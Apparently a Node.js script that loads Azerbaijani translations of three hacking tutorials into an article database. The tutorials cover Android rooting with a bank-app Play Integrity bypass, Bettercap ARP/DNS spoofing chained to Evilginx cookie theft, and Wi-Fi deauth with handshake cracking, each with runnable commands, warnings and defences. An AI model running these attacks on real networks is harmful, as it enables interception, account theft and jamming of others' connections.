// Полные AZ переводы для art-17, art-18, art-19
const fs = require('fs');
const path = require('path');
const file = path.join(__dirname, 'data', 'articles.json');
const db = JSON.parse(fs.readFileSync(file, 'utf8'));

const T = {
  'art-19': {
    name_az: '🤖 2026-da Android root: Magisk vs KernelSU vs APatch — hansını seçməli',
    description_az: 'Root 2026-da 2015-dəki kimi deyil. Google Play Integrity API ilə qaydaları sıxlaşdırıb, banklar imtina edir. Amma root hələ də realdır — düzgün alətlər lazımdır.',
    content_az: `# 2026-da Android root: Magisk vs KernelSU vs APatch

2026-da root 2015-dəkindən fərqlidir. Google **Play Integrity API** (keçmiş SafetyNet) ilə qaydaları sıxlaşdırıb, bank tətbiqləri işləməkdən imtina edir. Amma root hələ də realdır, sadəcə düzgün alətlər lazımdır.

::warn Root cihazı zəiflədir. Banklı əsas telefonda etmə. Daha yaxşı — modlar üçün ayrıca cihaz.

## 1. 2026-da root niyə lazımdır

Köhnə səbəblər (reklam blokunun, bekap) artıq lazım deyil — AdGuard və Google Backup var. Müasir kassolar:

- **AdGuard Pro** sistem rejimində (VPN-servis səviyyəsində filtr)
- **App freezer** (silmədən sistem zibilini dondurmaq)
- **Magisk-modulları** (qaranlıq mövzular, kastom şriftlər, audio mods)
- **Kastom ROM-lar** (LineageOS, GrapheneOS) — modlar üçün tez-tez root tələb edir
- **Reverse engineering** — tətbiqlərin analizi, frida/objection
- İstehsalçının **məcburi tətbiqlərinin silinməsi** (Samsung Bloatware, MIUI ads)

## 2. 2026-da üç alət

2026-da root almaq üçün üç aktual yol var:

| Alət | Prinsip | Üstünlüklər | Mənfi cəhətlər |
|---|---|---|---|
| **Magisk** | boot.img vasitəsilə systemless | Ən yetkin, modul dolu | Play Integrity-ni keçmək çətin |
| **KernelSU** | nüvəni dəyişdirməklə | Ən yaxşı gizlənir | Uyğun nüvə lazımdır |
| **APatch** | runtime-da nüvə patch-i | boot.img lazım deyil | Cavan, daha az modul |

::github topjohnwu/Magisk | Magisk — Android root-un qızıl standartı
::github tiann/KernelSU | KernelSU — nüvə vasitəsilə root, ən yaxşı gizlənmə
::github bmax121/APatch | APatch — runtime nüvə patch-i ilə root

## 3. Magisk — klassika

**Magisk** — ən populyar. boot.img-i əvəzləyərək işləyir.

### Quraşdırma (ümumi proses)

1. **Bootloader-i aç** (istehsalçılara görə fərqlidir)
2. Öz proşivkan üçün **stock boot.img** yüklə
3. Magisk app quraşdır:

::download https://github.com/topjohnwu/Magisk/releases | Magisk APK yüklə

4. Tətbiqdə → "Patch boot.img" → faylı seç
5. fastboot ilə proşivka et:

\`\`\`bash
fastboot flash boot magisk_patched.img
fastboot reboot
\`\`\`

### Modullar

Root sonrası → Magisk → Modules. 2026-da TOP-lar:

- **LSPosed** — Xposed framework, istənilən tətbiqi modifikasiya
- **AFWall+** — qabaqcıl firewall
- **Universal SafetyNet Fix** (USNF) — Play Integrity bypass (aşağıda bax)
- **Shamiko** — root-un tətbiqlərdən qabaqcıl gizlənməsi

::github LSPosed/LSPosed | LSPosed — müasir Android üçün Xposed
::github LSPosed/LSPlant | LSPlant — hooking mühərrikinin əsası

## 4. KernelSU — gizlənmə vacib olanlar üçün

**KernelSU** nüvəni dəyişdirməklə işləyir, systemless deyil. Üstünlüklər:

- Root **nüvə daxilində** — tətbiqlər standart üsullarla aşkar edə bilmir
- Magisk app lazım deyil — KernelSU manager ilə idarə
- Su binary /system-də görünmür

### Tələblər
- Uyğun nüvə (tez-tez kastom — məsələn, açıq mənbəli OnePlus)
- Android 11+

::github tiann/KernelSU | KernelSU + uyğun cihazların siyahısı

::tip Pixel-in varsa — KernelSU + GrapheneOS **çox** təmiz root verir, maksimum gizlənmə ilə.

## 5. Play Integrity bypass — 2026-nın əsas problemi

Google **Play Integrity API** yoxlayır:
- BASIC (Android cihazı) — keçilir
- DEVICE (sistem bütövlüyü) — çətinliklə keçilir
- STRONG (hardware-attested) — **demək olar ki, keçilmir**

Bankların əksəriyyəti MEETS_DEVICE_INTEGRITY (DEVICE) tələb edir.

### 2026-da nə işləyir

::github chiteroman/PlayIntegrityFork | PlayIntegrityFork — bypass üçün ən yaxşı Magisk-modul

Quraşdırma:
1. Magisk → quraşdırılıb və işləyir
2. PlayIntegrityFork module yüklə → Magisk vasitəsilə flash et
3. \`Shamiko\` modulu → maliyyə tətbiqləri üçün DenyList
4. Magisk → Settings → \`Enforce DenyList\` ON
5. DenyList-ə **bütün** bank/dövlət tətbiqlərini əlavə et

::github LSPosed/LSPosed-MetaNeedle | MetaNeedle — bəzi yoxlamaların bypass-ı

::warn Bank tətbiqləri detect-i daim yeniləyir. Bu gün işləyən — bir həftəyə işləməyə bilər.

## 6. Bootloader unlock — başlanğıc nöqtəsi

Açılmamış bootloader ilə root **mümkün deyil**.

| İstehsalçı | Açılma | Çətinlik |
|---|---|---|
| **Pixel** | \`fastboot flashing unlock\` | Trivial |
| **OnePlus** | Saytda akkaunt → token | Asan |
| **Xiaomi** | Mi Unlock Tool, 7-30 gün gözləmə | Orta |
| **Samsung** | Yalnız OEM versiyalarda, US/CN bloklanıb | Modeldən asılı |
| **Huawei** | 2018-dən sonra demək olar ki, mümkün deyil | Mümkünsüz |

::download https://flashing-tool.netlify.app/ | Açma üzrə universal təlimat

## 7. Daxili root-lu kastom ROM-lar

Alternativ: Magisk vasitəsilə root əvəzinə — kastom proşivka qoymaq.

::download https://lineageos.org/ | LineageOS — 200+ cihaz üçün açıq mənbəli Android
::download https://grapheneos.org/ | GrapheneOS — məxfilik + təhlükəsizlik (yalnız Pixel)
::download https://e.foundation/ | /e/OS — degoogled Android

::tip GrapheneOS — ən təhlükəsiz variant. Pixel + GrapheneOS + KernelSU-üzərindən-Magisk = aşkarlanmayan kirpi.

## 8. Root-dan SONRA nə etməli

1. **VPN rejimində AdGuard** — bütün tətbiqlərdə sistemli reklam blokunun
2. **AFWall+** — tətbiq səviyyəsində firewall
3. **LSPosed + modullar**: HideMyApplist, XPrivacyLua
4. **Backup**: TWRP / OrangeFox recovery, Swift Backup, Migrate
5. **Şifrələmə** rootda itmir (varsayılan olaraq açıqdır)

::github GrapheneOS/Auditor | Auditor — öz cihazının bütövlüyünün yoxlanması

## 9. Root-dan sonra NƏ etməməli

::warn Ciddi xəbərdarlıqlar:

- **Əsas bank üçün root istifadə etmə** — bypass işləsə də, kompromis riski var
- **Anlaşılmaz mənbələrdən modul qoyma** — root = hər şeyə giriş
- **Tanış olmayan root-ToS-larına parol vurma** — adətən tələdir
- **Magisk/KernelSU yalnız GitHub-dakı rəsmi repo-lardan**

## 10. Alternativ: Shizuku (root-suz root)

Root qorxuludursa, amma imtiyaz lazımdırsa — **Shizuku**:

::github RikkaApps/Shizuku | Shizuku — tam root-suz tətbiqlər üçün ADB-imtiyazları

USB-ADB ilə bir dəfə işə salınır, sonra tətbiqlər root-suz sistem hüquqlarını alır. Daha az imkanlar, amma daha az risk.

## Yekun

2026-da root canlıdır, amma bilik tələb edir:

1. **Pixel** + **Magisk** + **PlayIntegrityFork** + **Shamiko** — imkanlar və ştels balansı
2. **Pixel** + **GrapheneOS** + **KernelSU** — maksimum məxfilik lazımdırsa
3. **Shizuku** — sadəcə konkret tətbiqlər üçün sistem hüquqları lazımdırsa

::warn Bootloader unlock bütün məlumatları silir. Başlamazdan əvvəl bekap et.`
  },
  'art-18': {
    name_az: '🐍 2026-da MITM: Bettercap + sslstrip — trafiki necə tuturlar',
    description_az: 'MITM 2010-larda parolları açıq oxuyurdu. 2026-da HTTPS hər yerdədir, amma DNS-də, metadata-da və köhnə protokollarda hücum hələ də işləyir.',
    content_az: `# 2026-da MITM: Bettercap + sslstrip

MITM (Man-In-The-Middle) — klassik hücumdur, sənin trafikin hücumçunun maşını üzərindən gedir. 2010-larda parolları açıq oxumaq olurdu. 2026-da — HTTPS hər yerdə, amma MITM **hələ də** DNS, metadata və köhnə protokollarda işləyir.

::warn Hücum şəbəkəyə fiziki giriş tələb edir (eyni parollu Wi-Fi, kabel şəbəkəsi). Yalnız öz şəbəkələrində tətbiq et.

## 1. ARP-spoofing vasitəsilə MITM necə işləyir

Lokal şəbəkədə cihazlar bir-birini **ARP** (Address Resolution Protocol) ilə tapır. Hücumçu saxta ARP-cavablar göndərir:

\`\`\`
Hücumçu → qurbana: "router AA:AA:AA:AA:AA:AA MAC-dadır" (bu mənim MAC-ımdır)
Hücumçu → router-ə: "qurban AA:AA:AA:AA:AA:AA MAC-dadır" (bu mənim MAC-ımdır)
\`\`\`

İndi qurbanın bütün trafiki hücumçudan keçir, o da onu daha sonra ötürür. Qurban heç nə hiss etmir.

## 2. Bettercap — əsas alət

::github bettercap/bettercap | bettercap — MITM/sniffing üçün İsveçrə bıçağı

Kali-də quraşdırma:

\`\`\`bash
sudo apt install bettercap
\`\`\`

İşə salma:

\`\`\`bash
sudo bettercap -iface wlan0
\`\`\`

Shell-də:

\`\`\`
> net.probe on
> net.show
\`\`\`

Şəbəkədəki bütün cihazları görürsən. Qurbanı seçirsən:

\`\`\`
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on
\`\`\`

İndi 192.168.1.50-nin bütün trafiki sənin üzərindən gedir.

## 3. 2026-da trafikdə nə görünür

### ✅ HTTPS-də belə görünür
- **DNS-sorğular** (DoH/DoT yoxsa) — \`hansı saytlara\` gedirsən
- TLS handshake-də **SNI** — \`hansı domeni\` sorğulayırsan (kontent yox, sayt adı)
- **Metadata**: paket ölçüləri, vaxtlar, paternlər
- **Təyinat IP**

### ❌ Görünmür
- HTTPS-sorğuların məzmunu
- Cookie-lər, parollar, formlar
- POST-sorğuların məzmunu

::tip 2026-da TLS 1.3 + Encrypted Client Hello (ECH) hətta SNI-i gizlədir. Cloudflare onu qlobal işə salıb — Firefox 118+ və ya Chrome 124+ lazımdır.

## 4. sslstrip — daunqreyd cəhdi (köhnəlib, amma maraqlıdır)

2010-larda sslstrip HTML-də \`https://\` -i \`http://\` ilə əvəzləyir və parolları oxuyurdu. 2026-da bu **işləmir** çünki **HSTS** (HTTP Strict Transport Security) — brauzerlər saytın HTTPS-lə getdiyini yadda saxlayır və HTTP-i iqnor edirlər.

Amma **HSTS preload-da olmayan yeni saytlarda** ilk ziyarətdə — hələ də mümkündür:

\`\`\`
> set http.proxy.sslstrip true
> http.proxy on
\`\`\`

::warn Əhəmiyyətli saytların 99%-i HSTS preload list-dədir. sslstrip yalnız kiçik özəl saytlarda nəticə verir.

## 5. DNS-spoofing — 2026-nın əsas silahı

HTTPS məzmunu əlçatmaz olduğundan, 2026-da MITM — bu **DNS-əvəzləmədir**:

\`\`\`
> set dns.spoof.domains *.gmail.com,*.bank.com
> set dns.spoof.address 1.2.3.4    # sənin saxta serverinin IP-si
> dns.spoof on
\`\`\`

Qurban \`gmail.com\` yazır → sənin serverinə düşür (Evilginx phishing işləyir).

::tip 2026-nın ən güclü zənciri: Bettercap (MITM + DNS spoof) → Evilginx (phishing proxy) → session cookie-lərinin tutulması. Wi-Fi-dan akkaunt oğurluğuna qədər tam zəncir.

::github kgretzky/evilginx2 | Evilginx (phishing haqqında məqaləyə bax)

## 6. Caplets — hazır ssenarilər

Bettercap **caplet**-ləri dəstəkləyir — avtomatlaşdırma skriptləri:

\`\`\`bash
sudo bettercap -caplet http-req-dump
\`\`\`

::github bettercap/caplets | Hazır caplet-lərin kataloqu: hstshijack, beef-active, password sniff

Ən məşhur — \`hstshijack\`:

\`\`\`
sudo bettercap -caplet hstshijack/hstshijack
\`\`\`

Domenləri oxşarlarına dəyişərək HSTS-i keçməyə çalışır (\`gmail.com\` → fərqli TLD-li \`gmaii.com\`).

## 7. Bettercap alternativləri

::github SySS-Research/Seth | Seth — RDP üçün MITM (Windows Remote Desktop)
::github lgandx/Responder | Responder — Windows-şəbəkələr üçün, LLMNR/NBT-NS zəhərləmə
::github Arszilla/ettercap | ettercap-NG — köhnə, amma hələ də işləyir

## 8. SSL-sertifikat saxtalığı (CA pinning bypass)

Qurbanın cihazına **fiziki giriş** varsa:

1. Qurbanda öz CA-sertifikatını qur (Settings → Security → Install certificate)
2. mitmproxy işə sal → cihazın bütün HTTPS-i açıq görür

::github mitmproxy/mitmproxy | mitmproxy — debug üçün HTTPS şərhi

::warn Qurbanda CA qoymadan — HTTPS deşifrə olunmur. "Təmiz" cihazda istənilən mitmproxy certificate warning verəcək, brauzer bloklayacaq.

## 9. MITM-dən necə qorunmaq

::warn Açıq WiFi-dasansa (kafe, hava limanı) — potensial MITM altında. Müdafiə:

1. **Həmişə VPN** — MITM olsa belə, yalnız VPN-serverə getdiyin görünür. Kontent ikinci qatla qorunur.
2. Brauzerdə **HTTPS-only mode** (Chrome/Firefox/Brave parametri) — bütün HTTP-yükləməni bloklayır.
3. **DNS over HTTPS** (DoH) və ya **DoT** — Cloudflare \`1.1.1.1\`, NextDNS. Hücumçu DNS-i görmür.
4. **HSTS preload** — bütün normal saytlar artıq preload list-dədir, sslstrip işləmir.
5. **Heç vaxt certificate warning-i iqnor etmə** — 99% halda bu MITM cəhdidir.

::download https://1.1.1.1/ | Cloudflare 1.1.1.1 — pulsuz DNS over HTTPS

### Router üçün
- **Dynamic ARP Inspection (DAI)** — korporativ router-lər bacarır, ev üçün nadir
- WiFi-da **WPA3** — klientlər fərdi açar alır, havada ARP-spoof işləmir
- Qonaq şəbəkəsi üçün **VLAN izolyasiya**

## 10. 2026-da MITM niyə nişe hücumdur

- **HTTPS hər yerdə** (brauzerlərdə trafikin 97%-i) → kontent qorunur
- **HSTS preload** → sslstrip işləmir
- **ECH (Encrypted Client Hello)** → hətta SNI gizlidir
- **DoH/DoT** → DNS şifrələnib
- Paranoidlərdə **VPN** → əlavə qat

MITM **canlıdır**, amma təmiz halda az verir. DNS hücumlarına → phishing → 2FA bypass üçün **birinci mərhələ** kimi istifadə olunur.

## Yekun

2026-da MITM — "Starbucks-da parolları oxuyuruq" deyil. Bu DNS-spoofing + Evilginx vasitəsilə phishing-ə **müqəddimədir**. Müdafiə: VPN + DoH + həmişə HTTPS + sertifikat xətalarını iqnor etmə.

::warn Yalnız öz şəbəkələrində tətbiq et. Yad şəbəkədə ARP-spoofing = RF CM 272-ci maddəsi / AR CM 271-1.`
  },
  'art-17': {
    name_az: '📡 Deauth hücumları: WiFi-dan necə qoparlar və necə qorunmaq',
    description_az: 'Bir əmrlə radius daxilində bütün cihazlar WiFi-dan atılır. 802.11 səviyyəsində işləyir, parol kömək etmir. Yeganə müdafiə — PMF-li WPA3.',
    content_az: `# Deauth hücumları: WiFi-dan necə qoparlar

Deauthentication-hücumu — bir əmr, və radius daxilindəki bütün cihazlar **WiFi-dan atılır**. Hücumu heç bir parol qabaqlaya bilməz — o, 802.11 protokolu səviyyəsində işləyir. Yeganə qoruma — PMF (Protected Management Frames) ilə WPA3.

::warn Yalnız öz şəbəkənizdə tətbiq edin. WiFi-ı sıxışdırmaq — CM-də maddədir (rabitə şəbəkələrinin işinin pozulması).

## 1. Necə işləyir

802.11 standartında **idarəetmə** kadrları (management frames) var — onlar varsayılan olaraq şifrələnmir. Onlardan biri — **Deauthentication** — klient və ya router əlaqəni qırmaq istəyəndə göndərilir.

Problem: **heç kim imzanı yoxlamır**. İstənilən kəs belə kadrı router adından klientə (və ya tərsinə) göndərə bilər — və sessiya qırılacaq.

\`\`\`
Hücumçu → [Router-in MAC-ından Deauth frame] → Klient
Klient düşünür: "router məni ayırmaq istəyir" → ayrılır
\`\`\`

Hər 100ms-də təkrar et — klient **heç vaxt geri qoşula bilməyəcək**.

## 2. Hücumçuya niyə lazımdır

- **Handshake tutmaq** — klient yenidən qoşulur → hashcat ilə offline brute üçün WPA2 əl-sıxma tutula bilər
- **Rəqibləri kənarlaşdırmaq** — kanalı azad etmək
- **MITM perexvat** — klient sənin saxta nöqtənə düşür (Evil Twin)
- **Sadəcə DoS** — şəbəkəni sıxışdırmaq

## 3. Nə lazımdır

::tip WPS üçün olan eyni quruluş — Kali + monitor mode adapter (Alfa AWUS036ACH idealdır).

\`\`\`bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
\`\`\`

Hədəfin BSSID-ini və kanalı yadda saxlayırsan. Sonra konkret şəbəkəyə fokuslan:

\`\`\`bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
\`\`\`

Solda qoşulu klientləri (onların MAC-ını) görəcəksən.

## 4. Aireplay-ng — klassika

\`\`\`bash
# Hamısını nöqtədən qopart
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Konkret klienti qopart
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
\`\`\`

- \`--deauth 0\` — sonsuz axın (rəqəm — neçə kadr)
- \`-a\` — router-in BSSID-i
- \`-c\` — klientin MAC-ı (göstərilməyibsə — hamıya)

::github aircrack-ng/aircrack-ng | aircrack-ng — WiFi alətlərinin standartı

## 5. mdk4 — kütləvi deauth

mdk4 daha ağıllıdır: kadrları daha sürətli göndərir, fasiləsiz rejimi dəstəkləyir, siyahı ilə hədəfləmə daha sadədir.

\`\`\`bash
# 6 kanalında radius daxilində hamıya Deauth
sudo mdk4 wlan0mon d -c 6
\`\`\`

::github aircrack-ng/mdk4 | mdk4 — kütləvi WiFi stress-test

::warn mdk4 saniyədə **150+ kadr** vurur — bu radius daxilində **hər şeyi** sıxışdırır, təkcə bir şəbəkəni yox. Qonşular, nənən, parking kameraları — hamısı yatacaq.

## 6. WifiJammer / Bettercap

Skript avtomatlaşdırması üçün:

::github DanMcInerney/wifijammer | wifijammer — Python skript, görünən bütün şəbəkələri avto-deauth
::github bettercap/bettercap | bettercap — MITM üçün İsveçrə bıçağı, deauth daxil olmaqla

\`\`\`bash
# bettercap
sudo bettercap -iface wlan0mon
> wifi.recon on
> wifi.deauth AA:BB:CC:DD:EE:FF
\`\`\`

## 7. Handshake tutmaqla əlaqə

Deauth-un əsas məqsədi — offline brute üçün **WPA handshake** tutmaqdır:

\`\`\`bash
# Terminal 1 — qulaq asırıq
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2 — təpik veririk
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
\`\`\`

Birinci terminalın yuxarı sağ küncündə \`[WPA handshake: AA:BB:CC...]\` görünəcək — handshake tutuldu. Sonra:

\`\`\`bash
# Konvertasiya
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Hashcat-da brute
hashcat -m 22000 hash.hc22000 rockyou.txt
\`\`\`

Hashcat haqqında daha ətraflı — [burada](/article/art-15).

## 8. Deauth-dan necə qorunmaq

::tip Yeganə real qoruma — PMF-li WPA3 (Protected Management Frames).

### WPA3 (Wi-Fi Protected Access 3)
- **Management frame**-ləri kriptoqrafik imza ilə qoruyur
- Yanlış imzalı Deauth-kadrlar **iqnor olunur**
- Router adminkasında işə sal: WiFi → Security → WPA3-Personal və ya WPA2/WPA3 Mixed

### WPA3 yoxdursa (köhnə router)
- **802.11w (Management Frame Protection)** işə sal — bəzi WPA2 router-lər opsional dəstəkləyir
- Gizli SSID və MAC filtrasiyası — deauth-a qarşı **faydasızdır**, narahat olma
- 2026-da 30$-dan başlayan **WPA3-router** al

### Monitorinq
- Router-də **wireless IDS** (WIDS) işə sal — şübhəli deauth-partlayışlarını loglayır
- Klientlərdə — Wireshark / airodump-ng → saniyədə >10 deauth görsən, sənə hücum olunur

## 9. 2026-da deauth niyə demək olar ki, faydasızdır

Müasir smartfonlar (iPhone 12+, Pixel 6+, Galaxy S22+) **WPA3** və **PMF** bacarır. Belə klientlərdə deauth-hücumu **uğursuz olur** — kadrlar iqnor edilir.

2018-2020-də deauth hamıda işləyirdi. 2026-da — yalnız WPA3-süz köhnə cihazlarda və router-lərdə.

::warn Amma 2026-da Azərbaycanda/Rusiyada ev şəbəkələrinin 60%-i hələ də PMF-siz WPA2-dədir — orada hücum işləyir.

## Yekun

Deauth — qədim hücumdur, amma PMF-siz WPA2 olduqca aktualdır. **İstifadəçi səviyyəsində** həll birdir: WPA3-router. Alternativ yoxdur.

::warn Bütün nümunələr — **öz** şəbəkələrini başa düşmək və test etmək üçündür. Yad şəbəkələrdə — CM maddəsi.`
  }
};

let count = 0;
db.items.forEach(item => {
  if (T[item.id]) {
    Object.assign(item, T[item.id]);
    count++;
  }
});

fs.writeFileSync(file, JSON.stringify(db, null, 2), 'utf8');
console.log('Updated', count, 'articles');
